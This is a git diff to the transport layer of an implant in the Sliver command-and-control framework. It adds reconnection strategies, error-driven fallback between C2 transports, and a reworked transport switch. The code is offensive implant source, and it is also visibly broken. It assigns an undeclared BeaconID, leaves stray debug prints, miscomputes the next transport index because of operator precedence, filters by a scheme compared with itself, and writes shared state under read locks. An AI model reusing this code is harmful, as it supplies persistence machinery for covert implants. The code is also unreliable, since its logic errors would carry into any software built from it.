@@ -25,35 +25,64 @@ import (
 
 	"errors"
 	"fmt"
+	insecureRand "math/rand"
+	"net/url"
 	"sync"
 	"time"
 
+	"github.com/gofrs/uuid"
+
 	"github.com/bishopfox/sliver/implant/sliver/comm"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+)
+
+const (
+	StrategyRandom       = "random"
+	StrategyRandomDomain = "random-domain"
+	StrategySequential   = "sequential"
+)
+
+var (
+	// ErrMaxAttempts - Passed by transports to the c2 controller
+	ErrMaxAttempts = errors.New("reached maximum connection attempts")
 )
 
 var (
 	// Transports - All active transports on this implant.
 	Transports = &c2s{
-		Available: []*C2{},
-		mutex:     &sync.RWMutex{},
-		waiter:    &sync.WaitGroup{},
+		Available:       []*C2{},
+		transportErrors: make(chan error, 1),
+		mutex:           &sync.RWMutex{},
 	}
 )
+
+// SessionID - A unique ID for the entire lifetime of this
+// session as beacon: might need to change this way to proceed.
+var SessionID string
+
+func init() {
+	id, err := uuid.NewV4()
+	if err != nil {
+		BeaconID = "00000000-0000-0000-0000-000000000000"
+	}
+	BeaconID = id.String()
+}
 
 // c2s - Holds all active c2s for this implant.
 // This is consumed by some handlers & listeners, as well as the routing system.
 type c2s struct {
-	Available []*C2           // All transports available (compiled in) to this implant
-	Server    *C2             // The transport tied to the C2 server (active connection)
-	mutex     *sync.RWMutex   // Concurrency
-	waiter    *sync.WaitGroup // Block so that the implant never exits without warning.
+	Available       []*C2         // All transports available (compiled in) to this implant
+	Active          *C2           // The transport tied to the C2 server (active connection)
+	transportErrors chan error    // When a transport fails, notify the error so we can cycle
+	mutex           *sync.RWMutex // Concurrency
+	isSwitching     bool          // Notify that we are currently switching the transport.
 }
 
 // Init - Parses all available transport strings and registers them as available transports.
 // Then starts the first transport in the list, for reaching back to the server.
 func (t *c2s) Init() (err error) {
 
-	// Register all available C2 transports
+	// Load all available C2 transports
 	for order, profile := range profiles {
 		c2, err := NewC2FromBytes(profile)
 		if err != nil {
@@ -62,55 +91,175 @@ func (t *c2s) Init() (err error) {
 			// {{end}}
 			continue
 		}
-
-		// Just increase the priority like the order in which they were compiled
 		c2.Priority = order
-
-		// And add it as available
 		t.Add(c2)
 	}
 	if len(t.Available) == 0 {
 		return errors.New("no available transports")
 	}
+	fmt.Println(len(t.Available))
 
 	// {{if .Config.Debug}}
 	log.Printf("Starting connection loop ...")
 	// {{end}}
 
-	// Then start the first C2 transport, with fallback if failure
-	for _, transport := range t.Available {
+	// Find the first C2, and attempt to start it
+	// or any subsequent until one is successful.
+	err = t.startTransports()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+		return
+	}
 
-		// This might will init the Comm system, but in the case of tunnel-based
-		// routing, we have concurrently started this process, and it will only
-		// finish its setup once we are out of this Init() function.
-		err = transport.Start()
+	// Start monitoring the transports for any connection errors,
+	// and handle them with the appropriate reconnection strategy.
+	t.handleTransportErrors()
 
+	return
+}
+
+// startTransports - Attempts to start the first transport for this program run,
+// and exit the function so that we can start monitoring for errors in another goroutine.
+func (t *c2s) startTransports() (err error) {
+
+	// Select the next (first) transport to be started according to the connection strategy
+	t.selectNextTransport()
+
+	for {
+		// Attempt to start
+		err = t.Active.Start(false, "")
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("Failed to start C2 Channel %s: %s", transport.Profile.ID, err)
+			log.Printf("Transport failed to start: %s", err)
 			// {{end}}
 
-			// Wait if this transport failed.
-			time.Sleep(time.Duration(transport.Profile.Interval))
+			// Select the next transport to be started
+			// according to the connection strategy
+			t.Active = t.selectNextTransport()
+
+			// Wait for the specified interval before looping and starting it.
+			time.Sleep(time.Duration(t.Active.Profile.Interval))
 			continue
 		}
 
-		// Else success: set transport as active C2,
-		t.mutex.RLock()
-		Transports.Server = transport
-		t.mutex.RUnlock()
-
-		break
+		// {{if .Config.Debug}}
+		log.Printf("Transport started ()", t.Active.uri.String())
+		// {{end}}
+		return
 	}
 
-	return nil
+	return errors.New("Failed to start one of the available transports")
 }
 
-// Serve - The C2s serve this implant, blocking so that the implant main loop never exits
-// TODO: Take advantage of the counter if that can help correctly unfolding various C2s.
-func (t *c2s) Serve() {
-	t.waiter.Add(1)
-	t.waiter.Wait()
+// handleTransportErrors - Monitor and handle errors
+// thrown by transports in the background. Blocking.
+func (t *c2s) handleTransportErrors() {
+
+	// Wait for an error to be thrown by a transport
+	for err := range t.transportErrors {
+		if err == nil {
+			// {{if .Config.Debug}}
+			log.Printf("(Switching) NIL ERROR ")
+			// {{end}}
+			continue
+		}
+
+		// Do not do anything if we are currently
+		// tasked to switch the transport
+		if t.isSwitching {
+			// {{if .Config.Debug}}
+			log.Printf("(Switching) Ignoring error: %s", err)
+			// {{end}}
+			continue
+		}
+
+		// If beacon, errors are constantly being thrown because closing connections
+		// will performing blocking reading operations will always return an error.
+		// We only care about if not maximum attempts reached
+		if t.Active.Profile.Type == sliverpb.C2Type_Beacon && err != ErrMaxAttempts {
+			// {{if .Config.Debug}}
+			log.Printf("(Beacon) Ignoring error: %s", err)
+			// {{end}}
+			continue
+		}
+
+		// {{if .Config.Debug}}
+		log.Printf("Active transport (%s) thrown an error: %s", t.Active.Profile.ID, err)
+		// {{end}}
+
+		// Select the next transport according to the specified connection strategy,
+		// and make it immediately as the Server transport, so we can cleanup if it fails.
+		t.selectNextTransport()
+
+		// Wait for the specified interval before starting it
+		time.Sleep(time.Duration(t.Active.Profile.Interval))
+
+		// And start it, sending any error back to this routine for cleanup
+		err = t.Active.Start(false, "")
+		// {{if .Config.Debug}}
+		if err != nil {
+			log.Printf("Failed to start transport: %s")
+		}
+		// {{end}}
+
+		// {{if .Config.Debug}}
+		log.Printf("Successful transport fallback (%s): %s", t.Active.Profile.ID, t.Active.uri.String())
+		// {{end}}
+	}
+}
+
+// selectNextTransport - Get the next transport
+// according to the implant connection strategy.
+func (t *c2s) selectNextTransport() (next *C2) {
+	switch "{{.Config.ConnectionStrategy}}" {
+
+	// Random C2 with any protocol
+	case StrategyRandom:
+		next = t.Available[insecureRand.Intn(len(t.Available))]
+
+	// Random C2 with the same protocol
+	case StrategyRandomDomain:
+		next = t.Available[insecureRand.Intn(len(t.Available))]
+		next = t.randomCCDomain(next.uri)
+
+	// Next C2 in order of loading
+	case StrategySequential:
+		if t.Active == nil {
+			next = t.Available[0]
+		} else {
+			fmt.Println("used sequential")
+			fmt.Println(t.Active.Priority % len(t.Available))
+			next = t.Available[t.Active.Priority+1%len(t.Available)]
+		}
+	default:
+		if t.Active == nil {
+			next = t.Available[0]
+		} else {
+			fmt.Println(t.Active.Priority % len(t.Available))
+			next = t.Available[t.Active.Priority+1%len(t.Available)]
+		}
+	}
+
+	// Set the transport
+	t.mutex.RLock()
+	t.Active = next
+	t.mutex.RUnlock()
+
+	return
+}
+
+// randomCCDomain - Random selection within a protocol
+func (t *c2s) randomCCDomain(uri *url.URL) *C2 {
+	pool := []*C2{}
+	protocol := uri.Scheme
+	for _, cc := range t.Available {
+		if uri.Scheme == protocol {
+			pool = append(pool, cc)
+		}
+	}
+	return pool[insecureRand.Intn(len(pool))]
 }
 
 // Directly add a C2 to the list of available transports
@@ -131,9 +280,11 @@ func (t *c2s) Add(c2 *C2) (err error) {
 	if c2.Priority > len(t.Available) {
 		c2.Priority = len(t.Available)
 		t.Available = append(t.Available, c2)
-	} else if c2.Priority < len(t.Available) && c2.Priority > 0 {
+	} else if c2.Priority < len(t.Available) && c2.Priority >= 0 {
 		following := append([]*C2{c2}, t.Available[c2.Priority:]...)
 		t.Available = append(t.Available[:c2.Priority], following...)
+	} else if c2.Priority == len(t.Available) {
+		t.Available = append(t.Available, c2)
 	}
 	t.mutex.Unlock()
 	return
@@ -169,9 +320,12 @@ func (t *c2s) Switch(ID string) (err error) {
 	if next == nil {
 		return fmt.Errorf("could not find transport with ID %s", ID)
 	}
+	t.mutex.RLock()
+	t.isSwitching = true
+	t.mutex.RUnlock()
 
 	// {{if .Config.Debug}}
-	log.Printf("Switching the current transport: %s", t.Server.ID)
+	log.Printf("Switching the current transport: %s", t.Active.ID)
 	log.Printf("New transport: %s", next.ID)
 	// {{end}}
 
@@ -188,30 +342,34 @@ func (t *c2s) Switch(ID string) (err error) {
 
 	// Keep the current transport ID, needed when registering
 	// again to the server, for identification purposes.
-	oldTransportID := t.Server.ID
+	oldTransportID := t.Active.ID
 
-	// Cut the current transport
-	err = t.Server.Stop()
+	// Start the transport first.
+	// This automatically sends a transport switch registration message
+	err = next.Start(true, oldTransportID)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+		t.mutex.RLock()
+		t.isSwitching = false
+		t.mutex.RUnlock()
+		return err
+	}
+
+	// Cut the old transport
+	err = t.Active.Stop()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf(err.Error())
 		// {{end}}
 	}
 
-	// Start the new one and assign to active server connection.
-	err = next.Start()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf(err.Error())
-		// {{end}}
-		return
-	}
-	t.Server = next
-
-	// Send a confirmation message, because the server is waiting for it.
-	// (by nature the call to switch transports must be asynchronous,
-	// without any error return in the same RPC handler)
-	next.RegisterTransportSwitch(oldTransportID)
+	// And assign the new one as current
+	t.mutex.RLock()
+	t.Active = next
+	t.isSwitching = false
+	t.mutex.RUnlock()
 
 	return nil
 }
@@ -223,11 +381,7 @@ func (t *c2s) Switch(ID string) (err error) {
 func (t *c2s) Shutdown() (err error) {
 
 	// Close the server transport
-	err = t.Server.Stop()
+	err = t.Active.Stop()
 
-	// Release lock on the implant main if asked to
-	// if exit {
-	//         t.waiter.Done()
-	// }
 	return
 }
